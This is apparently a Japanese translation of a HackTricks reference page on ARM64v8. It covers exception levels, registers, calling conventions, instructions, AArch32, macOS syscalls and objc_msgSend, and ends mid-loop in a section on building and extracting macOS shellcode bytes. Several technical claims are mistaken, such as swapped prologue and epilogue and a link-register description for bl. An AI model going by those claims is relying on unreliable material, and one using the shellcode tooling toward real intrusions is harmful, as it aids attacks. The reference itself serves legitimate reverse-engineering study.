# ARM64v8の概要

{{#include ../../../banners/hacktricks-training.md}}


## **例外レベル - EL（ARM64v8）**

ARMv8アーキテクチャでは、Exception Levels（EL）と呼ばれる実行レベルによって、実行環境の権限レベルと機能が定義されます。例外レベルはEL0からEL3までの4つあり、それぞれ異なる目的で使用されます。

1. **EL0 - User Mode**:
- 最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
- EL0で実行されるアプリケーションは、互いに分離され、さらにシステムソフトウェアからも分離されるため、セキュリティと安定性が向上します。
2. **EL1 - Operating System Kernel Mode**:
- ほとんどのOS kernelはこのレベルで実行されます。
- EL1はEL0より多くの権限を持ち、システムリソースにアクセスできますが、システムの完全性を確保するため、いくつかの制限があります。EL0からEL1へはSVC instructionを使用して移行します。
3. **EL2 - Hypervisor Mode**:
- このレベルはvirtualizationに使用されます。EL2で実行されるhypervisorは、同じ物理ハードウェア上で実行される複数のOS（それぞれ独自のEL1上で実行）を管理できます。
- EL2は、virtualized environmentの分離と制御のための機能を提供します。
- そのため、Parallelsのようなvirtual machine applicationは`hypervisor.framework`を使用してEL2とやり取りし、kernel extensionを必要とせずにvirtual machineを実行できます。
- EL1からEL2へ移行するには、`HVC` instructionを使用します。
4. **EL3 - Secure Monitor Mode**:
- 最も権限の高いレベルで、secure bootやtrusted execution environmentによく使用されます。
- EL3は、secure stateとnon-secure state間のアクセス（secure boot、trusted OSなど）を管理・制御できます。
- macOSではKPP（Kernel Patch Protection）に使用されていましたが、現在は使用されていません。
- AppleではEL3を現在使用していません。
- EL3への移行は通常、`SMC`（Secure Monitor Call）instructionを使用して行われます。

これらのレベルを使用することで、user applicationから最も権限の高いsystem softwareまで、システムのさまざまな要素を構造化された安全な方法で管理できます。ARMv8の権限レベルというアプローチは、異なるsystem componentを効果的に分離し、システムのセキュリティと堅牢性を高めます。

## **Registers（ARM64v8）**

ARM64には、`x0`から`x30`までラベル付けされた**31個のgeneral-purpose register**があります。それぞれ**64ビット**（8バイト）の値を格納できます。32ビット値のみを必要とする操作では、同じregisterをw0からw30という名前で32ビットmodeでアクセスできます。

1. **`x0`**から**`x7`** - これらは通常、scratch registerおよびsubroutineへparameterを渡すために使用されます。
- **`x0`**にはfunctionのreturn dataも格納されます。
2. **`x8`** - Linux kernelでは、`x8`は`svc` instructionのsystem call numberとして使用されます。**macOSではx16が使用されます！**
3. **`x9`**から**`x15`** - 追加のtemporary registerで、local variableによく使用されます。
4. **`x16`**と**`x17`** - **Intra-procedural Call Register**。immediate value用のtemporary registerです。indirect function callやPLT（Procedure Linkage Table）stubにも使用されます。
- macOSでは、**`x16`**が**`svc`** instructionの**system call number**として使用されます。
5. **`x18`** - **Platform register**。general-purpose registerとして使用できますが、一部のplatformではplatform固有の用途に予約されています。Windowsではcurrent thread environment blockへのpointer、Linux kernelでは現在**実行中のtask structure**を指すために使用されます。
6. **`x19`**から**`x28`** - これらはcallee-saved registerです。functionはcallerのためにこれらのregisterの値を保持する必要があるため、stackに保存し、callerへ戻る前に復元します。
7. **`x29`** - stack frameを追跡するための**frame pointer**です。function callによって新しいstack frameが作成されると、**`x29`** registerが**stackに保存**され、**新しい**frame pointer address（**`sp`** address）がこのregisterに保存されます。
- このregisterは**general-purpose register**としても使用できますが、通常は**local variable**へのreferenceとして使用されます。
8. **`x30`**または**`lr`** - **Link register**。`BL`（Branch with Link）または`BLR`（Branch with Link to Register）instructionが実行されると、**`pc`**の値をこのregisterに保存して**return address**を保持します。
- 他のregisterと同様に使用することもできます。
- 現在のfunctionが新しいfunctionをcallし、その結果`lr`を上書きする場合、最初にstackへ保存します。これがepilogueです（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`と`lr`を保存し、領域を確保して新しい`fp`を取得）。最後に復元します。これがprologueです（`ldp x29, x30, [sp], #48; ret` -> `fp`と`lr`を復元してreturn）。
9. **`sp`** - stackの先頭を追跡するための**Stack pointer**です。
- **`sp`**の値は常に少なくとも**quadword**境界に**alignment**されている必要があり、そうでなければalignment exceptionが発生する可能性があります。
10. **`pc`** - 次のinstructionを指す**Program counter**です。このregisterは、exception generation、exception return、branchによってのみ更新できます。このregisterを読み取れる通常のinstructionは、branch with link instruction（BL、BLR）だけです。これらは**`pc`** addressを**`lr`**（Link Register）に保存します。
11. **`xzr`** - **Zero register**。32ビットregister形式では**`wzr`**とも呼ばれます。簡単にzero valueを取得する（一般的な操作）ため、または**`subs`**を使用した比較（`subs XZR, Xn, #10`のように、結果をどこにも保存しない）に使用できます。

**`Wn`** registerは、**`Xn`** registerの**32ビット版**です。

> [!TIP]
> X0 - X18のregisterはvolatileです。つまり、function callやinterruptによって値が変更される可能性があります。一方、X19 - X28のregisterはnon-volatileであり、function callをまたいで値を保持する必要があります（"callee saved"）。

### SIMDおよびFloating-Point Register

さらに、optimized single instruction multiple data（SIMD）操作やfloating-point arithmeticに使用できる、長さ128ビットの**32個のregister**があります。これらはVn registerと呼ばれますが、**64**ビット、**32**ビット、**16**ビット、**8**ビットとしても操作でき、その場合はそれぞれ**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。

### System Register

**数百個のsystem register**（special-purpose register、SPRsとも呼ばれます）があり、**processor**の動作の**monitoring**と**control**に使用されます。\
これらは専用のspecial instructionである**`mrs`**と**`msr`**を使用した場合のみ、読み取りまたは設定が可能です。

special registerの**`TPIDR_EL0`**と**`TPIDDR_EL0`**は、reverse engineeringでよく見られます。`EL0` suffixは、そのregisterにアクセス可能な**最小のexception level**を示します（この場合、EL0は通常のprogramが実行される通常のexception（privilege）levelです）。\
これらは、thread-local storage領域のmemoryの**base address**を保存するためによく使用されます。通常、最初のregisterはEL0で実行されるprogramからread/write可能ですが、2番目はEL0からreadでき、EL1（kernelなど）からwriteできます。

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**には、複数のprocess componentが、OSから見える**`SPSR_ELx`** special registerにserializedされた状態で格納されます。Xは、triggerされたexceptionの**permission** **level**を示します（これにより、exception終了時にprocess stateを復元できます）。\
アクセス可能なfieldは次のとおりです。

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**、**`Z`**、**`C`**、**`V`** condition flag:
- **`N`**は、operationがnegative resultを返したことを示します。
- **`Z`**は、operationがzeroを返したことを示します。
- **`C`**は、operationでcarryが発生したことを示します。
- **`V`**は、operationでsigned overflowが発生したことを示します。
- 2つのpositive numberの合計がnegative resultになる。
- 2つのnegative numberの合計がpositive resultになる。
- subtractionで、大きなnegative numberを小さなpositive numberから（またはその逆に）減算し、結果が指定されたbit sizeの範囲内で表現できない場合。
- processorは、operationがsignedかunsignedかを認識しないため、operationでCとVを確認し、signedまたはunsignedの場合にcarryが発生したかどうかを示します。

> [!WARNING]
> すべてのinstructionがこれらのflagを更新するわけではありません。**`CMP`**や**`TST`**などは更新し、**`ADDS`**のようにs suffixを持つinstructionも更新します。

- 現在の**register width（`nRW`）flag**：flagの値が0の場合、programはresume後にAArch64 execution stateで実行されます。
- 現在の**Exception Level**（**`EL`**）：EL0で実行される通常のprogramでは値が0になります。
- **single stepping** flag（**`SS`**）：debuggerがsingle stepを行うために使用します。exceptionを通じて**`SPSR_ELx`**内のSS flagを1に設定すると、programは1 step実行した後、single step exceptionを発生させます。
- **illegal exception** state flag（**`IL`**）：privileged softwareが無効なexception level transferを実行した際にマークするために使用されます。このflagが1に設定され、processorはillegal state exceptionをtriggerします。
- **`DAIF`** flag：これらのflagにより、privileged programは特定のexternal exceptionを選択的にmaskできます。
- **`A`**が1の場合、**asynchronous abort**がtriggerされます。**`I`**はexternal hardware **Interrupt Requests**（IRQ）への応答を設定します。Fは**Fast Interrupt Requests**（FIR）に関連します。
- **stack pointer select** flag（**`SPS`**）：EL1以上で実行されるprivileged programは、自身のstack pointer registerとuser-modelのstack pointer（例：`SP_EL1`と`EL0`）を切り替えられます。この切り替えは**`SPSel`** special registerへの書き込みによって実行されます。EL0からは実行できません。

## **Calling Convention（ARM64v8）**

ARM64 calling conventionでは、functionの**最初の8個のparameter**は**`x0`**から**`x7`**のregisterに渡されます。**追加の**parameterは**stack**に渡されます。**return** valueは**`x0`** registerに返され、**128ビット長**の場合は**`x1`**にも返されます。**`x19`**から**`x30`**および**`sp`** registerは、function callをまたいで**保持**する必要があります。

assemblyでfunctionを読む場合は、**function prologueとepilogue**を探します。**prologue**では通常、**frame pointer（`x29`）を保存**し、**新しいframe pointerを設定**して、**stack領域を確保**します。**epilogue**では通常、保存されたframe pointerを**復元**し、functionから**return**します。

### SwiftのCalling Convention

Swiftには独自の**calling convention**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)で確認できます。

## **Common Instructions（ARM64v8）**

ARM64 instructionは一般に**`opcode dst, src1, src2`**という形式です。ここで**`opcode`**は実行するoperation（`add`、`sub`、`mov`など）、**`dst`**は結果を保存する**destination** register、**`src1`**と**`src2`**は**source** registerです。source registerの代わりにimmediate valueも使用できます。

- **`mov`**：あるregisterから別のregisterへ値を**Move**します。
- 例：`mov x0, x1` — `x1`の値を`x0`へ移動します。
- **`ldr`**：**memory**から値を**Load**してregisterに格納します。
- 例：`ldr x0, [x1]` — `x1`が指すmemory locationから値をloadして`x0`に格納します。
- **Offset mode**：origin pointerに影響するoffsetは、次のように指定します。
- `ldr x2, [x1, #8]`では、`x1 + 8`の値をx2にloadします。
- `ldr x2, [x0, x1, lsl #2]`では、x0のarrayから、位置x1（index）\* 4にあるobjectをx2にloadします。
- **Pre-indexed mode**：originに対して計算を行い、結果を取得すると同時に、新しいoriginをoriginに保存します。
- `ldr x2, [x1, #8]!`では、`x1 + 8`を`x2`にloadし、`x1`に`x1 + 8`の結果を保存します。
- `str lr, [sp, #-4]!`では、link registerをspに保存し、register spを更新します。
- **Post-index mode**：前のmodeと似ていますが、memory addressへアクセスした後にoffsetを計算して保存します。
- `ldr x0, [x1], #8`では、`x1`を`x0`にloadし、x1を`x1 + 8`で更新します。
- **PC-relative addressing**：この場合、loadするaddressはPC registerを基準に計算されます。
- `ldr x1, =_start`では、`_start` symbolの開始位置のaddressを、現在のPCを基準にx1へloadします。
- **`str`**：registerの値を**memory**へ**Store**します。
- 例：`str x0, [x1]` — `x0`の値を`x1`が指すmemory locationに保存します。
- **`ldp`**：**Load Pair of Registers**。このinstructionは、**連続したmemory** locationから2つのregisterを**load**します。memory addressは通常、別のregisterの値にoffsetを加算して形成されます。
- 例：`ldp x0, x1, [x2]` — `x2`および`x2 + 8`のmemory locationから、それぞれ`x0`と`x1`をloadします。
- **`stp`**：**Store Pair of Registers**。このinstructionは、2つのregisterを**連続したmemory** locationへ**store**します。memory addressは通常、別のregisterの値にoffsetを加算して形成されます。
- 例：`stp x0, x1, [sp]` — `x0`と`x1`を、それぞれ`sp`と`sp + 8`のmemory locationに保存します。
- `stp x0, x1, [sp, #16]!` — `x0`と`x1`を、それぞれ`sp+16`と`sp + 24`のmemory locationに保存し、`sp`を`sp+16`で更新します。
- **`add`**：2つのregisterの値を**Add**し、結果をregisterに保存します。
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (registerまたはimmediate)
- \[shift #N | RRX] -> shiftを実行、またはRRXをcall
- 例：`add x0, x1, x2` — `x1`と`x2`の値を加算し、結果を`x0`に保存します。
- `add x5, x5, #1, lsl #12` — これは4096（1を12回shiftした値）と等しくなります -> 1 0000 0000 0000 0000
- **`adds`**：`add`を実行し、flagを更新します。
- **`sub`**：2つのregisterの値を**Subtract**し、結果をregisterに保存します。
- **`add`**の**syntax**を参照してください。
- 例：`sub x0, x1, x2` — `x1`から`x2`の値を減算し、結果を`x0`に保存します。
- **`subs`**：`sub`と同じですが、flagを更新します。
- **`mul`**：**2つのregister**の値を**Multiply**し、結果をregisterに保存します。
- 例：`mul x0, x1, x2` — `x1`と`x2`の値を乗算し、結果を`x0`に保存します。
- **`div`**：一方のregisterの値を別のregisterの値で**Divide**し、結果をregisterに保存します。
- 例：`div x0, x1, x2` — `x1`の値を`x2`で除算し、結果を`x0`に保存します。
- **`lsl`**、**`lsr`**、**`asr`**、**`ror`、`rrx`**：
- **Logical shift left**：末尾から0を追加し、他のbitを前方へ移動します（2をn回掛ける）。
- **Logical shift right**：先頭から1を追加し、他のbitを後方へ移動します（unsignedで2をn回割る）。
- **Arithmetic shift right**：**`lsr`**と同様ですが、最上位bitが1の場合に0ではなく**1を追加**します（signedで2をn回割る）。
- **Rotate right**：**`lsr`**と同様ですが、右から削除されたbitを左に追加します。
- **Rotate Right with Extend**：**`ror`**と同様ですが、carry flagを「最上位bit」として扱います。carry flagをbit 31へ移動し、削除されたbitをcarry flagへ移動します。
- **`bfm`**：**Bit Field Move**。これらのoperationは、値から**bit `0...n`**をcopyし、**`m..m+n`**のpositionへ配置します。**`#s`**は**leftmost bit** position、**`#r`**は**rotate right amount**を指定します。
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert**：registerからbitfieldをcopyし、別のregisterへcopyします。
- **`BFI X1, X2, #3, #4`** X2から4 bitをX1の3rd bitからinsertします。
- **`BFXIL X1, X2, #3, #4`** X2の3rd bitから4 bitをextractし、X1へcopyします。
- **`SBFIZ X1, X2, #3, #4`** X2から4 bitをsign-extendし、右側のbitをzeroingしながら、bit position 3からX1へinsertします。
- **`SBFX X1, X2, #3, #4`** X2からbit 3を始点として4 bitをextractし、sign-extendして結果をX1へ配置します。
- **`UBFIZ X1, X2, #3, #4`** X2から4 bitをzero-extendし、右側のbitをzeroingしながら、bit position 3からX1へinsertします。
- **`UBFX X1, X2, #3, #4`** X2からbit 3を始点として4 bitをextractし、zero-extended resultをX1へ配置します。
- **Sign Extend To X**：値のsign（またはunsigned versionでは単に0）をextendし、その値を使用したoperationを可能にします。
- **`SXTB X1, W2`** W2からbyteのsignを**W2からX1へ**extendし（`W2`は`X2`の半分）、64 bitを埋めます。
- **`SXTH X1, W2`** W2から16 bit numberのsignをX1へextendし、64 bitを埋めます。
- **`SXTW X1, W2`** W2からbyteのsignをX1へextendし、64 bitを埋めます。
- **`UXTB X1, W2`** W2からbyteへ0（unsigned）を追加してX1へ移し、64 bitを埋めます。
- **`extr`**：連結された**register pair**からbitをextractします。
- 例：`EXTR W3, W2, W1, #3`では、**W1+W2**を連結し、W2のbit 3からW1のbit 3までを取得してW3に保存します。
- **`cmp`**：2つのregisterを**Compare**し、condition flagを設定します。destination registerをzero registerに設定する**`subs`のalias**です。`m == n`を確認する場合に便利です。
- **`subs`**と同じsyntaxをサポートします。
- 例：`cmp x0, x1` — `x0`と`x1`の値を比較し、それに応じてcondition flagを設定します。
- **`cmn`**：**Compare negative** operand。この場合は**`adds`のalias**で、同じsyntaxをサポートします。`m == -n`を確認する場合に便利です。
- **`ccmp`**：Conditional comparison。前のcomparisonがtrueの場合にのみ実行され、nzcv bitを明示的に設定します。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2かつx3 < x4の場合、funcへjumpします。
- これは、**前の`cmp`が`NE`の場合にのみ`ccmp`が実行される**ためです。そうでない場合、bit `nzcv`は0に設定されます（`blt` comparisonを満たしません）。
- これは`ccmn`としても使用できます（`cmp`と`cmn`の関係と同じでnegative）。
- **`tst`**：comparison対象の値が両方とも1であるかを確認します（結果をどこにも保存しないANDと同様に動作します）。registerと値を比較し、その値で示されたregisterのbitのいずれかが1かを確認する場合に便利です。
- 例：`tst X1, #7` X1の最後の3 bitのいずれかが1かを確認します。
- **`teq`**：結果を破棄するXOR operation
- **`b`**：Unconditional Branch
- 例：`b myFunction`
- これはlink registerにreturn addressを設定しません（returnが必要なsubroutine callには適しません）。
- **`bl`**：link付きの**Branch**。**subroutineをcall**するために使用します。**return addressを`x30`に保存**します。
- 例：`bl myFunction` — function `myFunction`をcallし、return addressを`x30`に保存します。
- これはlink registerにreturn addressを設定しません（returnが必要なsubroutine callには適しません）。
- **`blr`**：RegisterへのLink付きBranch。targetが**registerで指定**されるsubroutineを**call**するために使用します。return addressを`x30`に保存します。（これは
- 例：`blr x1` — `x1`に含まれるaddressのfunctionをcallし、return addressを`x30`に保存します。
- **`ret`**：通常、**`x30`**のaddressを使用して**subroutine**から**Return**します。
- 例：`ret` — `x30`のreturn addressを使用して現在のsubroutineからreturnします。
- **`b.<cond>`**：Conditional branch
- **`b.eq`**：直前の`cmp` instructionに基づき、**equalの場合にBranch**します。
- 例：`b.eq label` — 直前の`cmp` instructionで2つの値が等しい場合、`label`へjumpします。
- **`b.ne`**：**Not Equalの場合にBranch**します。このinstructionはcondition flag（前のcomparison instructionによって設定）を確認し、比較した値が等しくなければlabelまたはaddressへbranchします。
- 例：`cmp x0, x1` instructionの後に`b.ne label` — `x0`と`x1`の値が等しくなければ、`label`へjumpします。
- **`cbz`**：**Compare and Branch on Zero**。registerをzeroと比較し、等しい場合にlabelまたはaddressへbranchします。
- 例：`cbz x0, label` — `x0`の値がzeroの場合、`label`へjumpします。
- **`cbnz`**：**Compare and Branch on Non-Zero**。registerをzeroと比較し、等しくない場合にlabelまたはaddressへbranchします。
- 例：`cbnz x0, label` — `x0`の値がnon-zeroの場合、`label`へjumpします。
- **`tbnz`**：bitをtestし、nonzeroの場合にbranchします。
- 例：`tbnz x0, #8, label`
- **`tbz`**：bitをtestし、zeroの場合にbranchします。
- 例：`tbz x0, #8, label`
- **Conditional select operation**：conditional bitに応じて動作が変わるoperationです。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> trueの場合はX0 = X1、falseの場合はX0 = X2
- `csinc Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = Xm + 1
- `cinc Xd, Xn, cond` -> trueの場合はXd = Xn + 1、falseの場合はXd = Xn
- `csinv Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = NOT(Xm)
- `cinv Xd, Xn, cond` -> trueの場合はXd = NOT(Xn)、falseの場合はXd = Xn
- `csneg Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = - Xm
- `cneg Xd, Xn, cond` -> trueの場合はXd = - Xn、falseの場合はXd = Xn
- `cset Xd, Xn, Xm, cond` -> trueの場合はXd = 1、falseの場合はXd = 0
- `csetm Xd, Xn, Xm, cond` -> trueの場合はXd = \<all 1>、falseの場合はXd = 0
- **`adrp`**：**symbolのpage address**を計算し、registerに保存します。
- 例：`adrp x0, symbol` — `symbol`のpage addressを計算し、`x0`に保存します。
- **`ldrsw`**：memoryからsigned **32ビット**値を**Load**し、**64** bitへsign-extendします。これは一般的なSWITCH caseに使用されます。
- 例：`ldrsw x0, [x1]` — `x1`が指すmemory locationからsigned 32-bit valueをloadし、64 bitへsign-extendして`x0`に保存します。
- **`stur`**：別のregisterからのoffsetを使用して、register valueをmemory locationへ**Store**します。
- 例：`stur x0, [x1, #4]` — `x0`の値を、現在`x1`にあるaddressより4 byte大きいmemory addressに保存します。
- **`svc`**：**system call**を実行します。"Supervisor Call"の略です。processorがこのinstructionを実行すると、**user modeからkernel modeへ切り替わり**、**kernelのsystem call handling** codeが配置されたmemory上の特定locationへjumpします。

- 例：

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **link registerとframe pointerをstackへ保存する**：
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **新しい frame pointer を設定**: `mov x29, sp`（現在の関数用に新しい frame pointer を設定）
3. **（必要に応じて）local variables 用の stack 領域を確保**: `sub sp, sp, <size>`（`<size>` は必要なバイト数）

### **Function Epilogue**

1. **（確保していた場合）local variables 用の領域を解放**: `add sp, sp, <size>`
2. **link register と frame pointer を復元**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret`（link register 内のアドレスを使用して caller に制御を戻す）

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A は 32-bit プログラムの実行をサポートします。**AArch32** は **`A32`** と **`T32`** の **2 つの instruction sets** のいずれかで実行でき、**`interworking`** によってこれらを切り替えられます。\
**Privileged** な 64-bit プログラムは、より低い privilege の 32-bit **exception level** へ transfer を実行することで、**32-bit プログラムの実行**をスケジュールできます。\
64-bit から 32-bit への transition は、exception level が低下するときに発生することに注意してください（例えば、EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）。これは、**`AArch32`** process thread の実行準備が整ったときに、**`SPSR_ELx`** special register の **bit 4** を **1** に設定し、`SPSR_ELx` の残りの部分に **`AArch32`** プログラムの CPSR を格納することで行われます。その後、privileged process が **`ERET`** instruction を呼び出すと、processor は **CPSR に応じて** A32 または T32 に入り、**`AArch32`** へ transition します。**

**`interworking`** は CPSR の J bit と T bit を使用して行われます。`J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **`T32`** を意味します。これは基本的に、instruction set が T32 であることを示すために **最下位 bit を 1 に設定する**ことを意味します。\
これは **interworking branch instructions** の実行時に設定されますが、PC が destination register として設定される場合は、他の instructions によって直接設定することもできます。例:

別の例:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### レジスタ

16個の32ビットレジスタ（r0-r15）があります。**r0からr14**は**任意の操作**に使用できますが、一部は通常予約されています。

- **`r15`**: プログラムカウンタ（常時）。次の命令のアドレスを保持します。A32では current + 8、T32では current + 4です。
- **`r11`**: フレームポインタ
- **`r12`**: プロシージャ内呼び出しレジスタ
- **`r13`**: スタックポインタ（スタックは常に16バイト境界にアラインされることに注意してください）
- **`r14`**: リンクレジスタ

さらに、レジスタは**`banked registries`**によってバックアップされます。これはレジスタの値を格納する領域であり、例外処理や特権操作において、毎回レジスタを手動で保存・復元する必要をなくし、**高速なコンテキストスイッチ**を実行できるようにします。\
これは、プロセッサの状態を**`CPSR`から、例外が移行するプロセッサモードの`SPSR`へ保存**することで行われます。例外から戻る際には、**`CPSR`が`SPSR`から復元**されます。

### CPSR - Current Program Status Register

AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、後で実行を復元するため、例外が発生した際には**`SPSR_ELx`**にも保存されます。

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

フィールドはいくつかのグループに分けられます。

- Application Program Status Register (APSR): 算術フラグであり、EL0からアクセス可能
- Execution State Registers: プロセスの動作（OSによって管理される）

#### Application Program Status Register (APSR)

- **`N`**、**`Z`**、**`C`**、**`V`**フラグ（AArch64と同様）
- **`Q`**フラグ: 専用の飽和算術命令の実行中に**integer saturationが発生**すると、常に1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまでその値を維持します。また、その値を暗黙的に確認する命令は存在しないため、手動で読み取る必要があります。
- **`GE`**（Greater than or equal）フラグ: 「parallel add」や「parallel subtract」などのSIMD（Single Instruction, Multiple Data）操作で使用されます。これらの操作により、1つの命令で複数のデータポイントを処理できます。

たとえば、**`UADD8`**命令は、2つの32ビットオペランドから**4組のバイトを並列に加算**し、その結果を32ビットレジスタに格納します。その後、これらの結果に基づいて**APSRの`GE`フラグを設定**します。各GEフラグは、4つのバイト加算のうち1つに対応し、そのバイトペアの加算で**overflowが発生したか**を示します。

**`SEL`**命令は、これらのGEフラグを使用して条件付きアクションを実行します。

#### Execution State Registers

- **`J`**ビットと**`T`**ビット: **`J`**は0である必要があります。**`T`**が0の場合は命令セットA32が使用され、1の場合はT32が使用されます。
- **IT Block State Register**（`ITSTATE`）: 10-15ビットおよび25-26ビットです。**`IT`**を前置したグループ内の命令に対する条件を格納します。
- **`E`**ビット: エンディアンを示します。
- **Mode and Exception Mask Bits**（0-4）: 現在の実行状態を決定します。5番目のビットは、プログラムが32ビット（1）または64ビット（0）として実行されているかを示します。残りの4ビットは、現在使用されている**exception mode**（例外が発生して処理中の場合）を表します。設定された値は、この例外の処理中に別の例外が発生した場合の**現在の優先度**を示します。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 特定の例外は、**`A`**、`I`、`F`ビットを使用して無効化できます。**`A`**が1の場合、**asynchronous aborts**がトリガーされることを意味します。**`I`**は、外部ハードウェアの**Interrupts Requests**（IRQ）への応答を設定します。また、Fは**Fast Interrupt Requests**（FIR）に関連します。

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を確認するか、`cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`を実行してください。BSD syscallsでは**x16 > 0**になります。

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)で`mach_trap_table`を、[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)でプロトタイプを確認してください。Mach trapsの最大数は`MACH_TRAP_TABLE_COUNT` = 128です。Mach trapsでは**x16 < 0**になるため、前のリストの番号を**マイナス**にして呼び出す必要があります。**`_kernelrpc_mach_vm_allocate_trap`**は**`-10`**です。

これら（およびBSD）のsyscallsをどのように呼び出すかを確認するには、disassemblerで**`libsystem_kernel.dylib`**を調べることもできます。
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> **source code**を確認する**よりも**、**`libsystem_kernel.dylib`**の**decompiled** codeを確認した方が簡単な場合があります。これは、複数のsyscall（BSDおよびMach）のcodeがscripts経由で生成されるためです（source code内のcommentsを確認してください）。一方、dylibでは何が呼び出されているかを確認できます。

### machdep calls

XNUは、machine dependentと呼ばれる別のタイプのcallsもサポートしています。これらのcallsのnumbersはarchitectureによって異なり、callsもnumbersも一定であり続ける保証はありません。

### comm page

これはkernelが所有するmemory pageで、すべてのusers processのaddress spaceにmapされています。kernel servicesで非常に頻繁に使用されるものについて、user modeからkernel spaceへのtransitionが非常に非効率になるため、syscallsを使用するよりもこのtransitionを高速化することを目的としています。

例えば、`gettimeofdate` callは`timeval`のvalueをcomm pageから直接読み取ります。

### objc_msgSend

Objective-CまたはSwift programsでこのfunctionが使用されているのを非常によく見かけます。このfunctionを使うと、Objective-C objectのmethodを呼び出せます。

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> instanceへのPointer
- x1: op -> methodのSelector
- x2... -> invoked methodの残りのarguments

したがって、このfunctionへのbranchの前にbreakpointを設定すると、以下のようにlldbで何がinvokedされるかを簡単に確認できます（この例では、objectが`NSConcreteTask`のobjectを呼び出し、そのobjectがcommandを実行します）。
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼び出されたときに `/tmp/msgSends-pid` のようなファイルへ log を記録できます。
>
> さらに、**`OBJC_HELP=1`** を設定して任意の binary を呼び出すと、特定の Objc-C の action が発生したときに **log** を記録するために使用できる、その他の環境変数を確認できます。

この関数が呼び出されると、指定された instance の呼び出し先 method を見つける必要があり、そのために以下の検索が行われます。

- Optimistic cache lookup を実行:
- 成功した場合は終了
- runtimeLock を acquire（read）
- （realize && !cls->realized）の場合、class を realize
- （initialize && !cls->initialized）の場合、class を initialize
- class 自身の cache を試行:
- 成功した場合は終了
- class の method list を試行:
- 見つかった場合、cache に格納して終了
- superclass の cache を試行:
- 成功した場合は終了
- superclass の method list を試行:
- 見つかった場合、cache に格納して終了
- （resolver）の場合、method resolver を試行し、class lookup から再実行
- ここまで到達した場合（その他すべてが失敗した場合）、forwarder を試行

### Shellcodes

Compile するには:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイト列を抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
新しいmacOSの場合：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
